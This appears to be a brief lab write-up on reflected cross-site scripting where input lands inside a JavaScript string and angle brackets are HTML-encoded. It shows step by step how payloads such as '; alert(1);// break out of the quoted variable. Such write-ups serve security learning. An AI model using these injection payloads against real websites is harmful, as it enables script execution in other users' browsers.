# Reflected XSS into a JavaScript string with angle brackets HTML encoded

## Metadata

| Property | Value |
|----------|-------|

---

'; → var searchTerms=**'';';**
 '; alert(1); →var searchTerms=**'; alert(1);';**
However, as seen, there is one ' character left unused. For this, I modified my payload to → **'; alert(1);' ** 

But if it still couldn’t trigger the XSS use a comment for the one ’ left  **'; alert(1);//'**
